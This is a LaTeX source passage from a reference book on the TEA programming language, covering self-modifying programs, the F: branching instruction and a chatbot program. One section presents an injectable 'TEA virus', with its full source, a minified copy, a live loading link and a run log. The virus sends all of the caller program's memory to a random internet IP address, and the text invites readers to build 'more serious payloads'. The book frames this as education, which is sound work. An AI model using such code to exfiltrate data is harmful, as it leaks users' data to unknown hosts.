  %\caption{The TEA Instruction Lexical Specification (regular language)}
  %\label{FIG1}



And another example... also an interactive one:




  \begin{tcbverbatim}[title=Sample Session of Self-Modifying TEA Hello World]
Input was:
Hello World


Auto-Generated Program Was:
t!: :
b!: :
i:


Output Was:
hi there 
  \end{tcbverbatim}
  %\caption{The TEA Instruction Lexical Specification (regular language)}
  %\label{FIG1}


This last one interestingly generated a program that prompted the user for some input at runtime, and so, the output of the main program is based on that input instead of the original explicit input!

\vspace{1em}

And then one final example output to show just how interesting this little self-modifying program might be...


  \begin{tcbverbatim}[title=Sample Session of Self-Modifying TEA Hello World]
Input was:
Hello World


Auto-Generated Program Was:
r!: :
g: :
t!:


Output Was:
Hello World
Hello Worl
Hello Wor
Hello Wo
Hello W
Hello 
Hello
Hell
Hel
He
H
  \end{tcbverbatim}
  %\caption{The TEA Instruction Lexical Specification (regular language)}
  %\label{FIG1}



\subsection{EXAMPLE 2: OFFENSIVE TEA-VIRUS PROGRAM MODIFYING and EXPOSING A CALLER PROGRAM via WEB}
\label{SECEXAMP2E}


First, let us try to build rapport for this next example, by first picturing what could go wrong when we have the power to write programs that can modifying themselves or which can modify other programs... We shall use some still-comics originally shared on the \textbf{UIC}\footnote{\textbf{UIC}: core Uganda Internet Community: \url{https://t.me/ugandanow}} which also happens to be the first Internet Community where both the Tech-inspired web-comic \#icecomics is typically posted, but also where much of the progress on the TEA language is shared with a close-knit circle of potential users and friends. In these pictures, we see the \#icecomic character, Ruby, chatting with her friend about a potentially malicious TEA program she came across...

\begin{figure}[H]
  \centering
  \begin{subfigure}[b]{0.45\textwidth}
    \includegraphics[width=\textwidth]{resources/images/self_mod1.jpg}
    %\caption{N-SIGIL v1.0.1: Intro Greeting Interface}
    %\label{FIGNSIGIL}
  \end{subfigure}
  \hfill
  \begin{subfigure}[b]{0.45\textwidth}
    \includegraphics[width=\textwidth]{resources/images/self_mod2.jpg}
    %\caption{N-SIGIL v1.0.1: a basic qrcode for the base-10 o-SSI}
    %\label{FIGNSIGIL2}
  \end{subfigure}
  \caption{\textbf{ICecomics} Ruby Complains about Self-Modifying TEA Program}
  \label{FIGSELFMODDEMO}
\end{figure}


 \begin{figure}[H]
  \centering
  \begin{subfigure}[b]{0.45\textwidth}
    \includegraphics[width=\textwidth]{resources/images/self_mod3.jpg}
    %\caption{N-SIGIL v1.0.1: Intro Greeting Interface}
    %\label{FIGNSIGIL}
  \end{subfigure}
  \hfill
  \begin{subfigure}[b]{0.45\textwidth}
    \includegraphics[width=\textwidth]{resources/images/hacker.jpg}
    %\caption{N-SIGIL v1.0.1: a basic qrcode for the base-10 o-SSI}
    %\label{FIGNSIGIL2}
  \end{subfigure}
  \caption{Hacking and Info-Sec Action Leveraging TEA Programming}
  \label{FIGSELFMODDEMO2}
\end{figure}



This example is shared here, for especially education/research purposes and is not meant to be actually used in real-life because... well, it could be dangerous!

\vspace{1em}

Essentially, we have crafted a special virus-like TEA program that can be injected into other TEA programs, and which injected program then, compromises the security of the caller/main program because it siphons off all the data the caller program had in memory, and then posts it to some address on the Internet. For purposes of demonstrating how convoluted such programs might be, we do not post to a specific IP address on the network, but instead let the program auto-generate its own destination address, and so, in a way, it also demonstrates how a hacker might craft a program that steals or shares secrets with destination computers that are otherwise hard to pin-down or which span a very large address-space so that determining to whom the data is being sent is actually hard.

\vspace{1em}

For purposes of helping students and other researchers understand this program, the original specification for the example is as such:


\begin{center}
\fbox{\begin{minipage}{0.9\textwidth}
\LARGE
\textbf{Specification of A Self-modifying TEA Virus Program:}\\

Compose an injectable TEA program that does the following:

\begin{enumerate}

\item Generates a random number and stores it in a vault named id

\item Generates a random alpha-message and stores it in a vault named data.

\item Generates a random IP address

\item Creates a TEA program that can make an HTTP GET request to that random IP address, sending everything in the vaults/memory to that random IP address as part of URL query data (including whatever is in the main program vaults)

\item It then prints whatever was returned from the remote server if not empty otherwise returns an error message indicating the randomly generated id, data and random IP address that couldn't respond as the sub-program output.

\item Make the above functionality all reside inside a single Stored Program in a vault named vCMD

\item Inject that program into the caller/main program using E*!:vCMD that shall also immediately execute it.

\item The main program shall become modified from that point on-wards, so that it executes the injected code, posts its memory details to the remote address and at the end of the injected program, has the AI holding the self-diagnosis message from the injected program or a message from the remote contacted server/Network end-point.

\item For education purposes, let the injected program merely print whatever is the AI after the injected program is executed and make the caller program quit unconditionally.
\end{enumerate}

\end{minipage}}
\\
\end{center}


Such a program could be something like this...


 \begin{figure}[H]
 \Large
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: TEA VIRUS Example]
  \begin{lstlisting}[language=TEA]
#store original input in main program
i:{Hello World} | v:vIN 

#the evil program stored in a string...
v:vCMD:"
n!:1000 | v:id #random id
p!:10 | v:data #random data
n!:256:0:4:. | v:ip #random ip address
v:vPROTOCOL:{http://}
x*:vPROTOCOL | v:url #target web endpoint
w*: #make HTTP GET with all vaults!
v:vOUT #store output/results
"

#now inject/execute that stored-virus-program 
#in main program
E*!:vCMD #modifies main program

#store any resulting output
v:vOUT

#in case we got any output post-self-modification, 
#print it and quit
#q:^$

#otherwise present the session results..
v:I:{Original Input was:}|v:C:{Injected Program Was:} 
| v:O:{Output Was:} | v:S:_
g*:_:I:vIN:S:C:vCMD:S:O:vOUT
r!:_:{
}
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: An Injectable TEA VIRUS Program Demonstrating SELF-MODIFYING Capabilities and Info-SEC Offensive Action}
  \label{FIGE1}
\end{figure}


Upon running that code, anywhere TEA can work, we shall get results such as the following...


  %\begin{tcolorbox}[title=Sample Text Containing Phone Contacts,  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
  \begin{tcbverbatim}[title=Sample Session of Injectable WEB-accessing TEA VIRUS]
Original Input was:
Hello World


Injected Program Was:

n!:1000 | v:id #random id
p!:10 | v:data #random data
n!:256:0:4:. | v:ip #random ip address
v:vPROTOCOL:{http://}
x*:vPROTOCOL | v:url #target web endpoint
w*: #make HTTP GET with all vaults!
v:vOUT #store output/results



Output Was:
[ERROR]: NetworkError: Failed to execute 'send' on 'XMLHttpRequest': Failed to load 'http://50.183.200.135/?vIN=Hello+World&vCMD=%0An%21%3A1000+%7C+v%3Aid+%23random+id%0Ap%21%3A10+%7C+v%3Adata+%23random+data%0An%21%3A256%3A0%3A4%3A.+%7C+v%3Aip+%23random+ip+address%0Av%3AvPROTOCOL%3A%7Bhttp%3A%2F%2F%7D%0Ax*%3AvPROTOCOL+%7C+v%3Aurl+%23target+web+endpoint%0Aw*%3A+%23make+HTTP+GET+with+all+vaults%21%0Av%3AvOUT+%23store+output%2Fresults%0A&id=642&data=vgisdhgmya&ip=50.183.200.135&vPROTOCOL=http%3A%2F%2F&url=http%3A%2F%2F50.183.200.135'. 
  \end{tcbverbatim}
  %\caption{The TEA Instruction Lexical Specification (regular language)}
  %\label{FIG1}


Note that the program is definitely attempting to make an HTTP GET request to a random address on the Internet. This might work or not --- for example, there is no guarantee that the target IP address actually exists nor that the server or network endpoint being contacted will accept the request, process it nor send back and useful message/result. However, the program does indeed make a network call, and data is actually posted off the calling system to some resource on the network. This alone could cause data-leaks or unknown side-effects over the network. However, despite that happens, the program has been written in such a way that we can at least easily DEBUG what actually was done --- we get to see what data the TEA-virus attempted to send to the remote server, we also see what IP address it was trying to contact, and then what result or error ensued from that call.

\vspace{1em}

For those interested in pursuing this line of research --- for example, students exploring domains like network-security, information-security, penetration-testing, hacking, virus-programming etc, it shall perhaps help offer some insights into what actual professional hackers might do when given the right kind of tools or languages.

\vspace{1em}

Also, for purposes of appreciating and testing this code out in real-life, one might load it into the WEB TEA IDE and try either modifying it further\footnote{Note that the TEA WEB IDE not only allows one to unminify a program, but also validate and/or sanitize it to ensure that it conforms to the right syntax and that it can readily be shared without extraneous comments, etc.} or build upon it to craft more serious payloads/programs. The minified version of the program can be loaded for testing via the call:


\vspace{1em}

 \url{https://tea.nuchwezi.com/?fc=https://gist.githubusercontent.com/mcnemesis/143ea8c1d49aee8e7758f5c414125382/raw/tea_virus_example_selfmod_min.tea}

\vspace{1em}



And for those interested, the minified+sanitized version of this program is as such:



 \begin{figure}[H]
 \Large
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: TEA VIRUS Example]
  \begin{lstlisting}[language=TEA]
i:{Hello World}
v:vIN
v:vCMD:"n!:1000|v:id|p!:10|v:data|n!:256:0:4:.|v:ip|
v:vPROTOCOL:{http://}|x*:vPROTOCOL|v:url|w*:|v:vOUT"
E*!:vCMD
v:vOUT
v:I:{Original Input was:}
v:C:{Injected Program Was:}
v:O:{Output Was:}
v:S:_
g*:_:I:vIN:S:C:vCMD:S:O:vOUT
r!:_:{
}
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: The Injectable TEA VIRUS Program Minified and Sanitized}
  \label{FIGE2}
\end{figure}




%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: F
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{F: FORK}
\label{CHAPF}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & Fork\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Conditionally Jump across a TEA program
	\item Implementing Branching Logic in a program
	\item How to Leverage Code Encapsulation or Closures Without Using \textbf{E:}
	\item Branching Logic Based on Pattern Matching --- applies \textbf{\hyperref[SECREGEXP]{TEA Regular Expressions}}
	\item Singular or Binary Branching Mechanism\footnote{Unlike \textbf{J:} which can only implement \textbf{singular jump instructions}.}
	\item A Logic-Only\footnote{Like \textbf{J:}, \textbf{L:} and \textbf{Q:}, \textbf{F:} is one of few TEA operators that performs logic-only operations and so that, any value of a program's \textbf{Active Input} before the instruction is encountered or executed in a TEA program, shall stay the same/unmodified after the instruction is executed/processed successfully or not --- this is guaranteed behavior of the language, \textbf{based on the semantics of the TEA Instruction Set and what this document, the TEA Standard, specifies.}} Instruction whose core purpose is \textbf{to enable logic about state of the active TEA program} --- via tests or pattern-matching against the AI.
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of F:}
  \label{TABTAZF}
\end{table}


\section{SEMANTICS of F:}
\label{SECSEMF}

\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 

\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

f: & INERT\\

\rowcolor{lightgray}\bfseries \makecell[l]{f:REGEX:LA\\f:REGEX:LA:LB} & If the AI matches the regular expression REGEX then jump to the block in the TEA Program under the label LA, otherwise to LB. Only the first two parameters are mandatory. And LA, LB should be valid labels declared somewhere in the program.  \\

 f!: & INERT\\
 
\rowcolor{lightgray}\bfseries \makecell[l]{f!:REGEX:LA\\f!:REGEX:LA:LB} & Similar to f:, but the logic works same if AI does NOT match the regular expression REGEX\\

 
 \hline
\end{tabular}
\caption{The Semantics of F:}
\label{TABSEMF}
\end{table}


\section{NOTES about F:}
\label{SECNOTESF}

\textbf{\hyperref[TABTAZF]{Table \ref{TABTAZF}}} has already clearly laid out the true fundamental applications of the \textbf{F:} operator in the mathematics of the TEA language. It allows us to implement logic or reasoning, in a computer program, via the mechanism of branching instruction execution in a TEA program [source], based on the current state of the program's AI.

\vspace{1em}

It is important to note that \textbf{f:} is the equivalent of an IF-Statement in most other languages such as C, Java or Ruby. We shall look at some illustrative examples to drive home ideas about why and how useful it is:



\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=F: EXAMPLE 1]
  \begin{lstlisting}[language=TEA]
i:TEST
f:TEST:A:B
l:B
x!:_OK
q!:
l:A
r:^T:B 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


Would return ``BEST" if AI at line\#2 is ``TEST", otherwise something like ``Hello\_OK" if the program was run with explicit user input ``Hello" or ``INPUT\_OK" for any AI = ``INPUT" at the moment that instruction is executed.

\vspace{1em}

Note that properly using conditional branching in TEA via the f: construct requires some careful thought. First, because TEA has no explicit code block construct such as using ``curly-bracket" code encapsulation such as \texttt{\{...code\}} in some c-family/c-like languages. Also, it is important to note that TEA \textbf{Label-Blocks} can overlap based on which Label occurs first. For example, try to re-write the above program with the B-block (lines \#3-5), which is our ``Else-Block" being preceded by the A-block (lines \#6-7), and see if it would produce the same test results as what we expect in the above example.

\vspace{1em}


Another simpler, but still enlightening example is the following short program:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=F: EXAMPLE 2]
  \begin{lstlisting}[language=TEA]
#shall return input shuffled if it matches ``TEST" 
i:TEST | f!:TEST:A:B | l:B |a!: | l:A | v: 
#(=TTSE, VAULTS:{"":"TTSE"})
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\section{EXAMPLE APPLICATIONS of F:}
\label{SECEXAMPF}

  
For those familiar with how the idea of intelligence might be approached in matters such as simulating or manifesting human-like cognition --- spanning perception/sensing, measurement/pattern-matching/decoding.. and reaction/actuation --- the \textbf{Willrich Psychology} model\cite{Lutalo2025transpsy} as depicted in \textbf{\hyperref[FIGWILLPSY]{Figure \ref{FIGWILLPSY}}} being a handy and useful resource for cases when we need worry about [creating] intelligence [in things], but also, creating reactive, observant and logical artificial systems especially --- \textbf{automatons}\footnote{\textbf{Automatons} being the kind whose logic/processing is directly dependent on reasoning based on observing the agent's [external] environment, while \textbf{Psymatons}\cite{lutalo2025unraveling} might also span systems whose reasoning might depend on observing the system's/agent's [internal] state/[internal] environment in addition to the external --- somewhat as though they have extra-sensory perception/can reason based on intuition or to an external observer/actor, they seem to possess a spirit or non-physical form of cognition --- we might as well think of say reasoning by entropy/chaos!}, that might need to work independently of human supervision or processing. This is especially true of the case of attempting to program \textbf{artificial intelligence} systems or even basic knowledge systems and any semblance of artificial reasoning in a computer program\footnote{For example, the \textbf{ZHA} --- Zee Hacker Assistant, first presented in \cite{jwlzha}, and which also leverages the TEA language, shall serve well to illustrate the importance of \textbf{F:}}.


\begin{figure}[H]
  \begin{center}
     %\includegraphics[trim=LEFT BOTTOM RIGHT TOP, clip, width=0.9\textwidth,]{resources/pdfs/EXAPLATONICFORM-PFA.pdf}\\
  %\includegraphics[trim=2cm 8cm 2cm 8cm, clip, width=0.9\textwidth,]{resources/pdfs/ProteinSynthesisStateMachine.pdf}\\
   \includegraphics[trim=0cm 12cm 0cm 0cm, clip, width=0.9\textwidth,]{resources/pdfs/all_willrich_psychology.pdf}\\
   \caption{Unifying Model of Willrich Psychology --- in a mind-map}
  \label{FIGWILLPSY}
  \end{center}
\end{figure}

  Thus, for a good demonstration of how conditional branching and pattern-based reasoning or logic might be realized and applied using \textbf{F:} and TEA programming, we shall use the example of the \textbf{ZHA} --- \textit{Zee Hacker Assistant}, a \textbf{quasi-Artificial General Intelligence} program that one might also readily find in the TEA standard programs list at \url{https://tea.nuchwezi.com}, and which was also extensively covered in theory and culturally, in \cite{jwlzha} and \cite{lutalo2025unraveling}.

\subsection{EXAMPLE 1: ZHA --- ZEE HACKER ASSISTANT, a human support assistant chatbot system}
\label{SECEXAMP1F}  
  
 
 The most recent version of ZHA is as follows:
 

 %\begin{figure}[H]
 \small
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: ZEE HACKER ASSISTANT v1.0.2, breakable]
  %\begin{lstlisting}[language=TEA, caption={TP C7}, label={LSTC7}, numbers=left]
  \begin{lstlisting}[language=TEA,breaklines=true]
#!/usr/bin/tttt -fc
#----------------------------------------------|
# ZHA: Zee Hacker Assistant (v.1.0.2) | SEPT,'25
#----------------------------------------------|
# based off of TEAPAT: TEA Personal AssistanT:
# ref: https://doi.org/10.20944/preprints202502.1849.v1
#----------------------------------------------|
# This little program is a mini
# quasi-general artificial intelligence (qAGI)
# a special personal assistant perhaps
# best left for hackers, created 
# using the TEA programming language: https://bit.ly/projtea
###############################################|

#show welcome message
v:vORIN
v:vWELCOME:"##############################-##### *:{~} ZHA v1.0.2 #######-##############################-welcome to the future of chat_-##############################--"
v:vREG:-|h*!:vWELCOME:vREG
d:-|i:

y:vORIN # continue...

# set entity name
v:vPANAME:{ZHA}
f:^$:lSET:lNOSET
l:lSET
i:{Who do u wish to talk to? }|i: # user's entity name
g:|f!:^$:lSETI:lRULES|l:lSETI|v:vPANAME|j:lRULES 
l:lNOSET | y*: | v:vPANAME # evoke invoker's entity
l:lRULES # show instructions
i!:{At any time, reply with 'end' to quit
}|i:
v:vPROMPT:{: Talk to Me: }
g*:{ }:vPANAME:vPROMPT | v:vPAPROMPT
l:lPROMPT # prompt, get answer, process

# generate question
n:10000000|s:|v:qN|
# decide between ANE and NE
n:|f!:[2357]:qANE:qNE
l:qANE|
# decide between AE and ANE
n:1|f:0:qAE
# generate ANE
p!:27
|s:_:13:5 |d:_.*$
|s: |v:qR
|g*:{}:qR:qN
|j:qF|
l:qAE # pure AE
p!:27
|s:_:13:5 |d:_.*$ |s:
|j:qF|
l:qNE # pure NE
|y:qN
|l:qF # process and package question 
|a:
|x:{: }
v:vQ

# decide on whether question or not
n:|f:[2357]:lNoQ
y:vQ
|x!:{?: }
j:lProQ

l:lNoQ
y:vQ
|x!:{ : }

l:lProQ
# stash generated question
v:vGenQuestion

# decide between default or generated prompt
n:|f:[2468]:lGenPROMPT:lDefPROMPT

l:lGenPROMPT
g*:{ }:vPANAME:vGenQuestion | v:vGenPROMPT
y:vGenPROMPT|j:lDisplayPROMPT

l:lDefPROMPT
y:vPAPROMPT

l:lDisplayPROMPT
| i: |z:| q:^end$
# generate answer
n:10000000|s:|v:N|
# decide between ANE and NE
n:|f!:[2357]:ANE:NE
l:ANE|
# decide between AE and ANE
n:1|f:0:AE
# generate ANE
p!:27
|s:_:13:5 |d:_.*$ |s: |v:R
|g*:{}:R:N
|j:F|
l:AE # pure AE
p!:27
|s:_:13:5 |d:_.*$ |s:
|j:F|
l:NE # pure NE
|y:N
|l:F # process and package answer 
|a:|v:vA

# decide on whether question or not
n:|f!:[2357]:lQA
y:vA
|x!:{? }
j:lNoQA

l:lQA
y:vA
|x!:{ | }

l:lNoQA
# display answer
|i: 
| j:lPROMPT # and loop
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: ZEE HACKER ASSISTANT v1.0.2}
  \label{FIGF}
  \vspace{1cm}


 \large
 %\centering  
 \raggedright %force normal/left-alignment  
  
 
 \textbf{\hyperref[FIGF]{Figure \ref{FIGF}}} covers what \textbf{ZHA v1.0.2} is, and an interested person could go read the code, modify or run it directly and live via:
  
  
\vspace{1em}

 \url{https://tea.nuchwezi.com/?fc=https://gist.githubusercontent.com/mcnemesis/97caf6d0573f7447a807cf635fd8128f/raw/ba38dc52a5256734054bdff7154dee5a90259e39/zha.tea}

\vspace{1em}

However, for an interesting illustration of what one might accomplish using this little offline-capable multi-turn conversational chatbot AI system, the following screenshot, despite being of v1.0.1 of the program, shall serve that purpose:


  \begin{figure}[H]
      \centering
      \includegraphics[width=0.8\textwidth,]{resources/images/zha3.png}\\
        \caption{ZHA v1.0.1: a queer conversation between a hacker and the person of The President that he invoked via ZHA!}
      \label{FIGZHA}
    \end{figure}
  

Also, note that, despite the above interactive link pointing to a version of ZHA that loads and runs well in any web-browser and on any operating system, and yet, the same code, just as is shown in  \textbf{\hyperref[FIGZHA]{Figure \ref{FIGZHA}}}, can be run on the command-line such as with Linux, WSL or Solaris. The TEA program shall run and work as expected anywhere there is TEA v1.0.1 or later.



%%%%%%%%%%%---------[ CONCLUSION ]--------%%%%%%%%%%%%%%%%%

\chapter{Conclusion}
\label{SECCONC}

%---refs fixed up to this point...


We have covered sufficient material to help anyone coming to \textbf{TEA}, to be able to understand where the language came from, what it is based on, how it is designed or specified, what the language grammar is, how the language is processed, what sample programs in the language look like, and finally, what the core aspect of the language's Instruction Set are, A: to Z:, as well as sufficient test cases and sample codes for almost each specified aspect of those 26 core TEA primitives. This book is additionally meant to serve as a manual and reference for those using TEA programming in practice, across domains, as well as those reading and trying to understand, debug or extend TEA programs. We have also include material on where, how and which TEA standard to install where, how to run or update it, as well as where to find the developers for feedback, how to join the TEA user community and also learn from and follow the inventor of the language himself.



%---[ END BOOK CONTENT/CHAPTERS ]

%---[ BEGIN BOOK END/APPENDICES]
\begin{appendices}

%\chapter{Other Functions of DNA Beyond Protein Synthesis}
%\label{APPOTHERFUNC}


%-------[ END CONTENT ]


\end{appendices}

%\includepdf[pages=1]{resources/pdfs/note_cover.pdf}

\bibliographystyle{unsrt}
\bibliography{references}

%\comment{

%\newpage

\vspace{5cm}
\fbox{
\begin{minipage}{0.9\textwidth}
\textbf{TO CITE:}\\

Lutalo, Joseph Willrich (2024). \textbf{TEA TAZ: Transforming Executable Alphabet A: to Z: COMMAND SPACE SPECIFICATION.} Figshare. Book. \url{https://doi.org/10.6084/m9.figshare.26661328}

\end{minipage}}
\\
%}


%---[ END BOOK END/BACKCOVER]

% Float the section to center of page
\begin{center}
\vspace*{\fill}

\chapter*{About the Inventor of TEA\footnote{Refer to \textbf{ORCID:} \url{https://orcid.org/0000-0002-0002-4657}}}
\addcontentsline{toc}{chapter}{About the Inventor of TEA}


\begin{figure}[H]
  \begin{center}
  %\includegraphics[trim=0cm 20cm 0cm 0cm, clip, width=0.9\textwidth,]{resources/pdfs/OZINCIPHER-APP3-EXA.pdf}\\
  %\includegraphics[trim=LEFT BOTTOM RIGHT TOP, 
   \includegraphics[trim=0cm 1cm 0cm 2cm, clip, height=0.8\textheight,]{resources/pdfs/AboutAuthor.pdf}\\
   %\caption{The \textbf{alternative rendering}  of the same sequence as $\Omega_{veuler}$.}
  %\label{FIGLGESEULERVIRUSv2_ORIG}
  \end{center}
\end{figure}

\vspace*{\fill}
\end{center}


% insert [back] cover --- could just be a PNG or PDF
\includepdf[pages=1]{../taz_back_cover.pdf}

\end{document}